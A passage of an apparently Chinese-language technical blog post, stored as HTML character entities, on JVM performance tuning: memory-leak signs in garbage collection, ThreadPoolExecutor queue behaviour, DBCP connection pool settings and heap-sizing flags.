#x662F;&#x590D;&#x5236;&#x90E8;&#x5206;&#xFF0C;&#x56E0;&#x4E3A;&#x6BCF;&#x6B21;&#x5783;&#x573E;&#x56DE;&#x6536;&#x90FD;&#x6709;&#x4E00;&#x4E9B;&#x56DE;&#x6536;&#x4E0D;&#x6389;&#x7684;&#x5185;&#x5B58;&#xFF0C;&#x6240;&#x4EE5;&#x589E;&#x52A0;&#x4E86;&#x590D;&#x5236;&#x91CF;&#xFF0C;&#x5BFC;&#x81F4;&#x65F6;&#x95F4;&#x5EF6;&#x957F;&#x3002;&#x6240;&#x4EE5;&#xFF0C;&#x5783;&#x573E;&#x56DE;&#x6536;&#x7684;&#x65F6;&#x95F4;&#x4E5F;&#x53EF;&#x4EE5;&#x4F5C;&#x4E3A;&#x5224;&#x65AD;&#x5185;&#x5B58;&#x6CC4;&#x6F0F;&#x7684;&#x4F9D;&#x636E;<br><strong>Q&#xFF1A;&#x4E3A;&#x4EC0;&#x4E48;Full GC&#x7684;&#x6B21;&#x6570;&#x8D8A;&#x6765;&#x8D8A;&#x591A;&#xFF1F;</strong><br>A&#xFF1A;&#x56E0;&#x6B64;&#x5185;&#x5B58;&#x7684;&#x79EF;&#x7D2F;&#xFF0C;&#x9010;&#x6E10;&#x8017;&#x5C3D;&#x4E86;&#x5E74;&#x8001;&#x4EE3;&#x7684;&#x5185;&#x5B58;&#xFF0C;&#x5BFC;&#x81F4;&#x65B0;&#x5BF9;&#x8C61;&#x5206;&#x914D;&#x6CA1;&#x6709;&#x66F4;&#x591A;&#x7684;&#x7A7A;&#x95F4;&#xFF0C;&#x4ECE;&#x800C;&#x5BFC;&#x81F4;&#x9891;&#x7E41;&#x7684;&#x5783;&#x573E;&#x56DE;&#x6536;<br><strong>Q:&#x4E3A;&#x4EC0;&#x4E48;&#x5E74;&#x8001;&#x4EE3;&#x5360;&#x7528;&#x7684;&#x5185;&#x5B58;&#x8D8A;&#x6765;&#x8D8A;&#x5927;&#xFF1F;</strong><br>A:&#x56E0;&#x4E3A;&#x5E74;&#x8F7B;&#x4EE3;&#x7684;&#x5185;&#x5B58;&#x65E0;&#x6CD5;&#x88AB;&#x56DE;&#x6536;&#xFF0C;&#x8D8A;&#x6765;&#x8D8A;&#x591A;&#x5730;&#x88AB;Copy&#x5230;&#x5E74;&#x8001;&#x4EE3;</p>\n<p><br></p>\n<h3 id=\"&#x4E09;&#x3001;&#x6027;&#x80FD;&#x8C03;&#x4F18;\"><a href=\"#&#x4E09;&#x3001;&#x6027;&#x80FD;&#x8C03;&#x4F18;\" class=\"headerlink\" title=\"&#x4E09;&#x3001;&#x6027;&#x80FD;&#x8C03;&#x4F18;\"></a>&#x4E09;&#x3001;&#x6027;&#x80FD;&#x8C03;&#x4F18;</h3><p>&#x9664;&#x4E86;&#x4E0A;&#x8FF0;&#x5185;&#x5B58;&#x6CC4;&#x6F0F;&#x5916;&#xFF0C;&#x6211;&#x4EEC;&#x8FD8;&#x53D1;&#x73B0;CPU&#x957F;&#x671F;&#x4E0D;&#x8DB3;3%&#xFF0C;&#x7CFB;&#x7EDF;&#x541E;&#x5410;&#x91CF;&#x4E0D;&#x591F;&#xFF0C;&#x9488;&#x5BF9;8core&#xD7;16G&#x3001;64bit&#x7684;Linux&#x670D;&#x52A1;&#x5668;&#x6765;&#x8BF4;&#xFF0C;&#x662F;&#x4E25;&#x91CD;&#x7684;&#x8D44;&#x6E90;&#x6D6A;&#x8D39;&#x3002;&#x5728;CPU&#x8D1F;&#x8F7D;&#x4E0D;&#x8DB3;&#x7684;&#x540C;&#x65F6;&#xFF0C;&#x5076;&#x5C14;&#x4F1A;&#x6709;&#x7528;&#x6237;&#x53CD;&#x6620;&#x8BF7;&#x6C42;&#x7684;&#x65F6;&#x95F4;&#x8FC7;&#x957F;&#xFF0C;&#x6211;&#x4EEC;&#x610F;&#x8BC6;&#x5230;&#x5FC5;&#x987B;&#x5BF9;&#x7A0B;&#x5E8F;&#x53CA;JVM&#x8FDB;&#x884C;&#x8C03;&#x4F18;&#x3002;&#x4ECE;&#x4EE5;&#x4E0B;&#x51E0;&#x4E2A;&#x65B9;&#x9762;&#x8FDB;&#x884C;&#xFF1A;</p>\n<ul>\n<li>&#x7EBF;&#x7A0B;&#x6C60;&#xFF1A;&#x89E3;&#x51B3;&#x7528;&#x6237;&#x54CD;&#x5E94;&#x65F6;&#x95F4;&#x957F;&#x7684;&#x95EE;&#x9898;</li>\n<li>&#x8FDE;&#x63A5;&#x6C60;</li>\n<li>JVM&#x542F;&#x52A8;&#x53C2;&#x6570;&#xFF1A;&#x8C03;&#x6574;&#x5404;&#x4EE3;&#x7684;&#x5185;&#x5B58;&#x6BD4;&#x4F8B;&#x548C;&#x5783;&#x573E;&#x56DE;&#x6536;&#x7B97;&#x6CD5;&#xFF0C;&#x63D0;&#x9AD8;&#x541E;&#x5410;&#x91CF;</li>\n<li>&#x7A0B;&#x5E8F;&#x7B97;&#x6CD5;&#xFF1A;&#x6539;&#x8FDB;&#x7A0B;&#x5E8F;&#x903B;&#x8F91;&#x7B97;&#x6CD5;&#x63D0;&#x9AD8;&#x6027;&#x80FD;&#x3001;</li>\n</ul>\n<h4 id=\"1-Java&#x7EBF;&#x7A0B;&#x6C60;&#xFF08;java-util-concurrent-ThreadPoolExecutor&#xFF09;\"><a href=\"#1-Java&#x7EBF;&#x7A0B;&#x6C60;&#xFF08;java-util-concurrent-ThreadPoolExecutor&#xFF09;\" class=\"headerlink\" title=\"1.Java&#x7EBF;&#x7A0B;&#x6C60;&#xFF08;java.util.concurrent.ThreadPoolExecutor&#xFF09;\"></a>1.Java&#x7EBF;&#x7A0B;&#x6C60;&#xFF08;java.util.concurrent.ThreadPoolExecutor&#xFF09;</h4><p>&#x5927;&#x591A;&#x6570;JVM6&#x4E0A;&#x7684;&#x5E94;&#x7528;&#x91C7;&#x7528;&#x7684;&#x7EBF;&#x7A0B;&#x6C60;&#x90FD;&#x662F;JDK&#x81EA;&#x5E26;&#x7684;&#x7EBF;&#x7A0B;&#x6C60;&#xFF0C;&#x4E4B;&#x6240;&#x4EE5;&#x628A;&#x6210;&#x719F;&#x7684;Java&#x7EBF;&#x7A0B;&#x6C60;&#x8FDB;&#x884C;&#x7F57;&#x55E6;&#x8BF4;&#x660E;&#xFF0C;&#x662F;&#x56E0;&#x4E3A;&#x8BE5;&#x7EBF;&#x7A0B;&#x6C60;&#x7684;&#x884C;&#x4E3A;&#x4E0E;&#x6211;&#x4EEC;&#x60F3;&#x8C61;&#x7684;&#x6709;&#x70B9;&#x51FA;&#x5165;&#x3002;Java&#x7EBF;&#x7A0B;&#x6C60;&#x6709;&#x51E0;&#x4E2A;&#x91CD;&#x8981;&#x7684;&#x914D;&#x7F6E;&#x53C2;&#x6570;&#xFF1A;</p>\n<ul>\n<li>corePoolSize&#xFF1A;&#x6838;&#x5FC3;&#x7EBF;&#x7A0B;&#x6570;&#xFF08;&#x6700;&#x65B0;&#x7EBF;&#x7A0B;&#x6570;&#xFF09;</li>\n<li>maximumPoolSize&#xFF1A;&#x6700;&#x5927;&#x7EBF;&#x7A0B;&#x6570;&#xFF0C;&#x8D85;&#x8FC7;&#x8FD9;&#x4E2A;&#x6570;&#x91CF;&#x7684;&#x4EFB;&#x52A1;&#x4F1A;&#x88AB;&#x62D2;&#x7EDD;&#xFF0C;&#x7528;&#x6237;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;RejectedExecutionHandler&#x63A5;&#x53E3;&#x81EA;&#x5B9A;&#x4E49;&#x5904;&#x7406;&#x65B9;&#x5F0F;</li>\n<li>keepAliveTime&#xFF1A;&#x7EBF;&#x7A0B;&#x4FDD;&#x6301;&#x6D3B;&#x52A8;&#x7684;&#x65F6;&#x95F4;</li>\n<li>workQueue&#xFF1A;&#x5DE5;&#x4F5C;&#x961F;&#x5217;&#xFF0C;&#x5B58;&#x653E;&#x6267;&#x884C;&#x7684;&#x4EFB;&#x52A1;</li>\n</ul>\n<p>Java&#x7EBF;&#x7A0B;&#x6C60;&#x9700;&#x8981;&#x4F20;&#x5165;&#x4E00;&#x4E2A;Queue&#x53C2;&#x6570;&#xFF08;workQueue&#xFF09;&#x7528;&#x6765;&#x5B58;&#x653E;&#x6267;&#x884C;&#x7684;&#x4EFB;&#x52A1;&#xFF0C;&#x800C;&#x5BF9;Queue&#x7684;&#x4E0D;&#x540C;&#x9009;&#x62E9;&#xFF0C;&#x7EBF;&#x7A0B;&#x6C60;&#x6709;&#x5B8C;&#x5168;&#x4E0D;&#x540C;&#x7684;&#x884C;&#x4E3A;&#xFF1A;</p>\n<ul>\n<li>SynchronousQueue&#xFF1A; &#x4E00;&#x4E2A;&#x65E0;&#x5BB9;&#x91CF;&#x7684;&#x7B49;&#x5F85;&#x961F;&#x5217;&#xFF0C;&#x4E00;&#x4E2A;&#x7EBF;&#x7A0B;&#x7684;insert&#x64CD;&#x4F5C;&#x5FC5;&#x987B;&#x7B49;&#x5F85;&#x53E6;&#x4E00;&#x7EBF;&#x7A0B;&#x7684;remove&#x64CD;&#x4F5C;&#xFF0C;&#x91C7;&#x7528;&#x8FD9;&#x4E2A;Queue&#x7EBF;&#x7A0B;&#x6C60;&#x5C06;&#x4F1A;&#x4E3A;&#x6BCF;&#x4E2A;&#x4EFB;&#x52A1;&#x5206;&#x914D;&#x4E00;&#x4E2A;&#x65B0;&#x7EBF;&#x7A0B;</li>\n<li>LinkedBlockingQueue &#xFF1A; &#x65E0;&#x754C;&#x961F;&#x5217;&#xFF0C;&#x91C7;&#x7528;&#x8BE5;Queue&#xFF0C;&#x7EBF;&#x7A0B;&#x6C60;&#x5C06;&#x5FFD;&#x7565; maximumPoolSize&#x53C2;&#x6570;&#xFF0C;&#x4EC5;&#x7528;corePoolSize&#x7684;&#x7EBF;&#x7A0B;&#x5904;&#x7406;&#x6240;&#x6709;&#x7684;&#x4EFB;&#x52A1;&#xFF0C;&#x672A;&#x5904;&#x7406;&#x7684;&#x4EFB;&#x52A1;&#x4FBF;&#x5728;LinkedBlockingQueue&#x4E2D;&#x6392;&#x961F;</li>\n<li>ArrayBlockingQueue&#xFF1A; &#x6709;&#x754C;&#x961F;&#x5217;&#xFF0C;&#x5728;&#x6709;&#x754C;&#x961F;&#x5217;&#x548C; maximumPoolSize&#x7684;&#x4F5C;&#x7528;&#x4E0B;&#xFF0C;&#x7A0B;&#x5E8F;&#x5C06;&#x5F88;&#x96BE;&#x88AB;&#x8C03;&#x4F18;&#xFF1A;&#x66F4;&#x5927;&#x7684;Queue&#x548C;&#x5C0F;&#x7684;maximumPoolSize&#x5C06;&#x5BFC;&#x81F4;CPU&#x7684;&#x4F4E;&#x8D1F;&#x8F7D;&#xFF1B;&#x5C0F;&#x7684;Queue&#x548C;&#x5927;&#x7684;&#x6C60;&#xFF0C;Queue&#x5C31;&#x6CA1;&#x8D77;&#x52A8;&#x5E94;&#x6709;&#x7684;&#x4F5C;&#x7528;&#x3002;</li>\n</ul>\n<p>&#x5176;&#x5B9E;&#x6211;&#x4EEC;&#x7684;&#x8981;&#x6C42;&#x5F88;&#x7B80;&#x5355;&#xFF0C;&#x5E0C;&#x671B;&#x7EBF;&#x7A0B;&#x6C60;&#x80FD;&#x8DDF;&#x8FDE;&#x63A5;&#x6C60;&#x4E00;&#x6837;&#xFF0C;&#x80FD;&#x8BBE;&#x7F6E;&#x6700;&#x5C0F;&#x7EBF;&#x7A0B;&#x6570;&#x3001;&#x6700;&#x5927;&#x7EBF;&#x7A0B;&#x6570;&#xFF0C;&#x5F53;&#x6700;&#x5C0F;&#x6570;&lt;&#x4EFB;&#x52A1;&lt;&#x6700;&#x5927;&#x6570;&#x65F6;&#xFF0C;&#x5E94;&#x8BE5;&#x5206;&#x914D;&#x65B0;&#x7684;&#x7EBF;&#x7A0B;&#x5904;&#x7406;&#xFF1B;&#x5F53;&#x4EFB;&#x52A1;&gt;&#x6700;&#x5927;&#x6570;&#x65F6;&#xFF0C;&#x5E94;&#x8BE5;&#x7B49;&#x5F85;&#x6709;&#x7A7A;&#x95F2;&#x7EBF;&#x7A0B;&#x518D;&#x5904;&#x7406;&#x8BE5;&#x4EFB;&#x52A1;&#x3002;</p>\n<p>&#x4F46;&#x7EBF;&#x7A0B;&#x6C60;&#x7684;&#x8BBE;&#x8BA1;&#x601D;&#x8DEF;&#x662F;&#xFF0C;&#x4EFB;&#x52A1;&#x5E94;&#x8BE5;&#x653E;&#x5230;Queue&#x4E2D;&#xFF0C;&#x5F53;Queue&#x653E;&#x4E0D;&#x4E0B;&#x65F6;&#x518D;&#x8003;&#x8651;&#x7528;&#x65B0;&#x7EBF;&#x7A0B;&#x5904;&#x7406;&#xFF0C;&#x5982;&#x679C;Queue&#x6EE1;&#x4E14;&#x65E0;&#x6CD5;&#x6D3E;&#x751F;&#x65B0;&#x7EBF;&#x7A0B;&#xFF0C;&#x5C31;&#x62D2;&#x7EDD;&#x8BE5;&#x4EFB;&#x52A1;&#x3002;&#x8BBE;&#x8BA1;&#x5BFC;&#x81F4;&#x201C;&#x5148;&#x653E;&#x7B49;&#x6267;&#x884C;&#x201D;&#x3001;&#x201C;&#x653E;&#x4E0D;&#x4E0B;&#x518D;&#x6267;&#x884C;&#x201D;&#x3001;&#x201C;&#x62D2;&#x7EDD;&#x4E0D;&#x7B49;&#x5F85;&#x201D;&#x3002;&#x6240;&#x4EE5;&#xFF0C;&#x6839;&#x636E;&#x4E0D;&#x540C;&#x7684;Queue&#x53C2;&#x6570;&#xFF0C;&#x8981;&#x63D0;&#x9AD8;&#x541E;&#x5410;&#x91CF;&#x4E0D;&#x80FD;&#x4E00;&#x5473;&#x5730;&#x589E;&#x5927;maximumPoolSize&#x3002;</p>\n<p>&#x5F53;&#x7136;&#xFF0C;&#x8981;&#x8FBE;&#x5230;&#x6211;&#x4EEC;&#x7684;&#x76EE;&#x6807;&#xFF0C;&#x5FC5;&#x987B;&#x5BF9;&#x7EBF;&#x7A0B;&#x6C60;&#x8FDB;&#x884C;&#x4E00;&#x5B9A;&#x7684;&#x5C01;&#x88C5;&#xFF0C;&#x5E78;&#x8FD0;&#x7684;&#x662F;ThreadPoolExecutor&#x4E2D;&#x7559;&#x4E86;&#x8DB3;&#x591F;&#x7684;&#x81EA;&#x5B9A;&#x4E49;&#x63A5;&#x53E3;&#x4EE5;&#x5E2E;&#x52A9;&#x6211;&#x4EEC;&#x8FBE;&#x5230;&#x76EE;&#x6807;&#x3002;&#x6211;&#x4EEC;&#x5C01;&#x88C5;&#x7684;&#x65B9;&#x5F0F;&#x662F;&#xFF1A;</p>\n<ul>\n<li>&#x4EE5;SynchronousQueue&#x4F5C;&#x4E3A;&#x53C2;&#x6570;&#xFF0C;&#x4F7F;maximumPoolSize&#x53D1;&#x6325;&#x4F5C;&#x7528;&#xFF0C;&#x4EE5;&#x9632;&#x6B62;&#x7EBF;&#x7A0B;&#x88AB;&#x65E0;&#x9650;&#x5236;&#x7684;&#x5206;&#x914D;&#xFF0C;&#x540C;&#x65F6;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x63D0;&#x9AD8;maximumPoolSize&#x6765;&#x63D0;&#x9AD8;&#x7CFB;&#x7EDF;&#x541E;&#x5410;&#x91CF;</li>\n<li>&#x81EA;&#x5B9A;&#x4E49;&#x4E00;&#x4E2A;RejectedExecutionHandler&#xFF0C;&#x5F53;&#x7EBF;&#x7A0B;&#x6570;&#x8D85;&#x8FC7;maximumPoolSize&#x65F6;&#x8FDB;&#x884C;&#x5904;&#x7406;&#xFF0C;&#x5904;&#x7406;&#x65B9;&#x5F0F;&#x4E3A;&#x9694;&#x4E00;&#x6BB5;&#x65F6;&#x95F4;&#x68C0;&#x67E5;&#x7EBF;&#x7A0B;&#x6C60;&#x662F;&#x5426;&#x53EF;&#x4EE5;&#x6267;&#x884C;&#x65B0;Task&#xFF0C;&#x5982;&#x679C;&#x53EF;&#x4EE5;&#x628A;&#x62D2;&#x7EDD;&#x7684;Task&#x91CD;&#x65B0;&#x653E;&#x5165;&#x5230;&#x7EBF;&#x7A0B;&#x6C60;&#xFF0C;&#x68C0;&#x67E5;&#x7684;&#x65F6;&#x95F4;&#x4F9D;&#x8D56;keepAliveTime&#x7684;&#x5927;&#x5C0F;&#x3002;</li>\n</ul>\n<h4 id=\"2-&#x8FDE;&#x63A5;&#x6C60;&#xFF08;org-apache-commons-dbcp-BasicDataSource&#xFF09;\"><a href=\"#2-&#x8FDE;&#x63A5;&#x6C60;&#xFF08;org-apache-commons-dbcp-BasicDataSource&#xFF09;\" class=\"headerlink\" title=\"2.&#x8FDE;&#x63A5;&#x6C60;&#xFF08;org.apache.commons.dbcp.BasicDataSource&#xFF09;\"></a>2.&#x8FDE;&#x63A5;&#x6C60;&#xFF08;org.apache.commons.dbcp.BasicDataSource&#xFF09;</h4><p>&#x5728;&#x4F7F;&#x7528;org.apache.commons.dbcp.BasicDataSource&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x56E0;&#x4E3A;&#x4E4B;&#x524D;&#x91C7;&#x7528;&#x4E86;&#x9ED8;&#x8BA4;&#x914D;&#x7F6E;&#xFF0C;&#x6240;&#x4EE5;&#x5F53;&#x8BBF;&#x95EE;&#x91CF;&#x5927;&#x65F6;&#xFF0C;&#x901A;&#x8FC7;JMX&#x89C2;&#x5BDF;&#x5230;&#x5F88;&#x591A;Tomcat&#x7EBF;&#x7A0B;&#x90FD;&#x963B;&#x585E;&#x5728;BasicDataSource&#x4F7F;&#x7528;&#x7684;Apache ObjectPool&#x7684;&#x9501;&#x4E0A;&#xFF0C;&#x76F4;&#x63A5;&#x539F;&#x56E0;&#x5F53;&#x65F6;&#x662F;&#x56E0;&#x4E3A;BasicDataSource&#x8FDE;&#x63A5;&#x6C60;&#x7684;&#x6700;&#x5927;&#x8FDE;&#x63A5;&#x6570;&#x8BBE;&#x7F6E;&#x7684;&#x592A;&#x5C0F;&#xFF0C;&#x9ED8;&#x8BA4;&#x7684;BasicDataSource&#x914D;&#x7F6E;&#xFF0C;&#x4EC5;&#x4F7F;&#x7528;8&#x4E2A;&#x6700;&#x5927;&#x8FDE;&#x63A5;&#x3002;</p>\n<p>&#x6211;&#x8FD8;&#x89C2;&#x5BDF;&#x5230;&#x4E00;&#x4E2A;&#x95EE;&#x9898;&#xFF0C;&#x5F53;&#x8F83;&#x957F;&#x7684;&#x65F6;&#x95F4;&#x4E0D;&#x8BBF;&#x95EE;&#x7CFB;&#x7EDF;&#xFF0C;&#x6BD4;&#x5982;2&#x5929;&#xFF0C;DB&#x4E0A;&#x7684;Mysql&#x4F1A;&#x65AD;&#x6389;&#x6240;&#x4EE5;&#x7684;&#x8FDE;&#x63A5;&#xFF0C;&#x5BFC;&#x81F4;&#x8FDE;&#x63A5;&#x6C60;&#x4E2D;&#x7F13;&#x5B58;&#x7684;&#x8FDE;&#x63A5;&#x4E0D;&#x80FD;&#x7528;&#x3002;&#x4E3A;&#x4E86;&#x89E3;&#x51B3;&#x8FD9;&#x4E9B;&#x95EE;&#x9898;&#xFF0C;&#x6211;&#x4EEC;&#x5145;&#x5206;&#x7814;&#x7A76;&#x4E86;BasicDataSource&#xFF0C;&#x53D1;&#x73B0;&#x4E86;&#x4E00;&#x4E9B;&#x4F18;&#x5316;&#x7684;&#x70B9;&#xFF1A;</p>\n<ul>\n<li>Mysql&#x9ED8;&#x8BA4;&#x652F;&#x6301;100&#x4E2A;&#x94FE;&#x63A5;&#xFF0C;&#x6240;&#x4EE5;&#x6BCF;&#x4E2A;&#x8FDE;&#x63A5;&#x6C60;&#x7684;&#x914D;&#x7F6E;&#x8981;&#x6839;&#x636E;&#x96C6;&#x7FA4;&#x4E2D;&#x7684;&#x673A;&#x5668;&#x6570;&#x8FDB;&#x884C;&#xFF0C;&#x5982;&#x6709;2&#x53F0;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x53EF;&#x6BCF;&#x4E2A;&#x8BBE;&#x7F6E;&#x4E3A;60</li>\n<li>initialSize&#xFF1A;&#x53C2;&#x6570;&#x662F;&#x4E00;&#x76F4;&#x6253;&#x5F00;&#x7684;&#x8FDE;&#x63A5;&#x6570;</li>\n<li>minEvictableIdleTimeMillis&#xFF1A;&#x8BE5;&#x53C2;&#x6570;&#x8BBE;&#x7F6E;&#x6BCF;&#x4E2A;&#x8FDE;&#x63A5;&#x7684;&#x7A7A;&#x95F2;&#x65F6;&#x95F4;&#xFF0C;&#x8D85;&#x8FC7;&#x8FD9;&#x4E2A;&#x65F6;&#x95F4;&#x8FDE;&#x63A5;&#x5C06;&#x88AB;&#x5173;&#x95ED;</li>\n<li>timeBetweenEvictionRunsMillis&#xFF1A;&#x540E;&#x53F0;&#x7EBF;&#x7A0B;&#x7684;&#x8FD0;&#x884C;&#x5468;&#x671F;&#xFF0C;&#x7528;&#x6765;&#x68C0;&#x6D4B;&#x8FC7;&#x671F;&#x8FDE;&#x63A5;</li>\n<li>maxActive&#xFF1A;&#x6700;&#x5927;&#x80FD;&#x5206;&#x914D;&#x7684;&#x8FDE;&#x63A5;&#x6570;</li>\n<li>maxIdle&#xFF1A;&#x6700;&#x5927;&#x7A7A;&#x95F2;&#x6570;&#xFF0C;&#x5F53;&#x8FDE;&#x63A5;&#x4F7F;&#x7528;&#x5B8C;&#x6BD5;&#x540E;&#x53D1;&#x73B0;&#x8FDE;&#x63A5;&#x6570;&#x5927;&#x4E8E;maxIdle&#xFF0C;&#x8FDE;&#x63A5;&#x5C06;&#x88AB;&#x76F4;&#x63A5;&#x5173;&#x95ED;&#x3002;&#x53EA;&#x6709;initialSize &lt; x &lt; </li>\n<li>maxIdle&#x7684;&#x8FDE;&#x63A5;&#x5C06;&#x88AB;&#x5B9A;&#x671F;&#x68C0;&#x6D4B;&#x662F;&#x5426;&#x8D85;&#x671F;&#x3002;&#x8FD9;&#x4E2A;&#x53C2;&#x6570;&#x4E3B;&#x8981;&#x7528;&#x6765;&#x5728;&#x5CF0;&#x503C;&#x8BBF;&#x95EE;&#x65F6;&#x63D0;&#x9AD8;&#x541E;&#x5410;&#x91CF;&#x3002;</li>\n<li>initialSize&#x662F;&#x5982;&#x4F55;&#x4FDD;&#x6301;&#x7684;&#xFF1F;&#x7ECF;&#x8FC7;&#x7814;&#x7A76;&#x4EE3;&#x7801;&#x53D1;&#x73B0;&#xFF0C;BasicDataSource&#x4F1A;&#x5173;&#x95ED;&#x6240;&#x6709;&#x8D85;&#x671F;&#x7684;&#x8FDE;&#x63A5;&#xFF0C;&#x7136;&#x540E;&#x518D;&#x6253;&#x5F00;initialSize&#x6570;&#x91CF;&#x7684;&#x8FDE;&#x63A5;&#xFF0C;&#x8FD9;&#x4E2A;&#x7279;&#x6027;&#x4E0E;minEvictableIdleTimeMillis&#x3001;timeBetweenEvictionRunsMillis&#x4E00;&#x8D77;&#x4FDD;&#x8BC1;&#x4E86;&#x6240;&#x6709;&#x8D85;&#x671F;&#x7684;initialSize&#x8FDE;&#x63A5;&#x90FD;&#x4F1A;&#x88AB;&#x91CD;&#x65B0;&#x8FDE;&#x63A5;&#xFF0C;&#x4ECE;&#x800C;&#x907F;&#x514D;&#x4E86;Mysql&#x957F;&#x65F6;&#x95F4;&#x65E0;&#x52A8;&#x4F5C;&#x4F1A;&#x65AD;&#x6389;&#x8FDE;&#x63A5;&#x7684;&#x95EE;&#x9898;&#x3002;</li>\n</ul>\n<h4 id=\"3-JVM&#x53C2;&#x6570;\"><a href=\"#3-JVM&#x53C2;&#x6570;\" class=\"headerlink\" title=\"3.JVM&#x53C2;&#x6570;\"></a>3.JVM&#x53C2;&#x6570;</h4><p>&#x5728;JVM&#x542F;&#x52A8;&#x53C2;&#x6570;&#x4E2D;&#xFF0C;&#x53EF;&#x4EE5;&#x8BBE;&#x7F6E;&#x8DDF;&#x5185;&#x5B58;&#x3001;&#x5783;&#x573E;&#x56DE;&#x6536;&#x76F8;&#x5173;&#x7684;&#x4E00;&#x4E9B;&#x53C2;&#x6570;&#x8BBE;&#x7F6E;&#xFF0C;&#x9ED8;&#x8BA4;&#x60C5;&#x51B5;&#x4E0D;&#x505A;&#x4EFB;&#x4F55;&#x8BBE;&#x7F6E;JVM&#x4F1A;&#x5DE5;&#x4F5C;&#x7684;&#x5F88;&#x597D;&#xFF0C;&#x4F46;&#x5BF9;&#x4E00;&#x4E9B;&#x914D;&#x7F6E;&#x5F88;&#x597D;&#x7684;Server&#x548C;&#x5177;&#x4F53;&#x7684;&#x5E94;&#x7528;&#x5FC5;&#x987B;&#x4ED4;&#x7EC6;&#x8C03;&#x4F18;&#x624D;&#x80FD;&#x83B7;&#x5F97;&#x6700;&#x4F73;&#x6027;&#x80FD;&#x3002;&#x901A;&#x8FC7;&#x8BBE;&#x7F6E;&#x6211;&#x4EEC;&#x5E0C;&#x671B;&#x8FBE;&#x5230;&#x4E00;&#x4E9B;&#x76EE;&#x6807;&#xFF1A;</p>\n<ul>\n<li>GC&#x7684;&#x65F6;&#x95F4;&#x8DB3;&#x591F;&#x7684;&#x5C0F;</li>\n<li>GC&#x7684;&#x6B21;&#x6570;&#x8DB3;&#x591F;&#x7684;&#x5C11;</li>\n<li>&#x53D1;&#x751F;Full GC&#x7684;&#x5468;&#x671F;&#x8DB3;&#x591F;&#x7684;&#x957F;</li>\n</ul>\n<p>&#x524D;&#x4E24;&#x4E2A;&#x76EE;&#x524D;&#x662F;&#x76F8;&#x6096;&#x7684;&#xFF0C;&#x8981;&#x60F3;GC&#x65F6;&#x95F4;&#x5C0F;&#x5FC5;&#x987B;&#x8981;&#x4E00;&#x4E2A;&#x66F4;&#x5C0F;&#x7684;&#x5806;&#xFF0C;&#x8981;&#x4FDD;&#x8BC1;GC&#x6B21;&#x6570;&#x8DB3;&#x591F;&#x5C11;&#xFF0C;&#x5FC5;&#x987B;&#x4FDD;&#x8BC1;&#x4E00;&#x4E2A;&#x66F4;&#x5927;&#x7684;&#x5806;&#xFF0C;&#x6211;&#x4EEC;&#x53EA;&#x80FD;&#x53D6;&#x5176;&#x5E73;&#x8861;&#x3002;</p>\n<ul>\n<li><p>&#x9488;&#x5BF9;JVM&#x5806;&#x7684;&#x8BBE;&#x7F6E;&#x4E00;&#x822C;&#xFF0C;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;-Xms -Xmx&#x9650;&#x5B9A;&#x5176;&#x6700;&#x5C0F;&#x3001;&#x6700;&#x5927;&#x503C;&#xFF0C;&#x4E3A;&#x4E86;&#x9632;&#x6B62;&#x5783;&#x573E;&#x6536;&#x96C6;&#x5668;&#x5728;&#x6700;&#x5C0F;&#x3001;&#x6700;&#x5927;&#x4E4B;&#x95F4;&#x6536;&#x7F29;&#x5806;&#x800C;&#x4EA7;&#x751F;&#x989D;&#x5916;&#x7684;&#x65F6;&#x95F4;&#xFF0C;&#x6211;&#x4EEC;&#x901A;&#x5E38;&#x628A;&#x6700;&#x5927;&#x3001;&#x6700;&#x5C0F;&#x8BBE;&#x7F6E;&#x4E3A;&#x76F8;&#x540C;&#x7684;&#x503C;</p>\n</li>\n<li><p>&#x5E74;&#x8F7B;&#x4EE3;&#x548C;&#x5E74;&#x8001;&#x4EE3;&#x5C06;&#x6839;&#x636E;&#x9ED8;&#x8BA4;&#x7684;&#x6BD4;&#x4F8B;&#xFF08;1&#xFF1A;2&#xFF09;&#x5206;&#x914D;&#x5806;&#x5185;&#x5B58;&#xFF0C;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x8C03;&#x6574;&#x4E8C;&#x8005;&#x4E4B;&#x95F4;&#x7684;&#x6BD4;&#x7387;NewRadio&#x6765;&#x8C03;&#x6574;&#x4E8C;&#x8005;&#x4E4B;&#x95F4;&#x7684;&#x5927;&#x5C0F;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x9488;&#x5BF9;&#x56DE;&#x6536;&#x4EE3;&#xFF0C;&#x6BD4;&#x5982;&#x5E74;&#x8F7B;&#x4EE3;&#xFF0C;&#x901A;&#x8FC7; -XX:newSize -XX:MaxNewSize&#x6765;&#x8BBE;&#x7F6E;&#x5176;&#x7EDD;&#x5BF9;&#x5927;&#x5C0F;&#x3002;&#x540C;&#x6837;&#xFF0C;&#x4E3A;&#x4E86;&#x9632;&#x6B62;&#x5E74;&#x8F7B;&#x4EE3;&#x7684;&#x5806;&#x6536;&#x7F29;&#xFF0C;&#x6211;&#x4EEC;&#x901A;&#x5E38;&#x4F1A;&#x628A;-XX:newSize -XX:MaxNewSize&#x8BBE;&#x7F6E;&#x4E3A;&#x540C;&#x6837;&#x5927;&#x5C0F;</p>\n</li>\n<li><p>&#x5E74;&#x8F7B;&#x4EE3;&#x548C;&#x5E74;&#x8001;&#x4EE3;&#x8BBE;&#x7F6E;&#x591A;&#x5927;&#x624D;&#x7B97;&#x5408;&#x7406;&#xFF1F;&#x8FD9;&#x4E2A;&#x6211;&#x95EE;&#x9898;&#x6BEB;&#x65E0;&#x7591;&#x95EE;&#x662F;&#x6CA1;&#x6709;&#x7B54;&#x6848;&#x7684;&#xFF0C;&#x5426;&#x5219;&#x4E5F;&#x5C31;&#x4E0D;&#x4F1A;&#x6709;&#x8C03;&#x4F18;&#x3002;&#x6211;&#x4EEC;&#x89C2;&#x5BDF;&#x4E00;&#x4E0B;&#x4E8C;&#x8005;&#x5927;&#x5C0F;&#x53D8;&#x5316;&#x6709;&#x54EA;&#x4E9B;&#x5F71;&#x54CD;&#xFF1A;<br>&#xFF08;1&#xFF09;&#x66F4;&#x5927;&#x7684;&#x5E74;&#x8F7B;&#x4EE3;&#x5FC5;&#x7136;&#x5BFC;&#x81F4;&#x66F4;&#x5C0F;&#x7684;&#x5E74;&#x8001;&#x4EE3;&#xFF0C;&#x5927;&#x7684;&#x5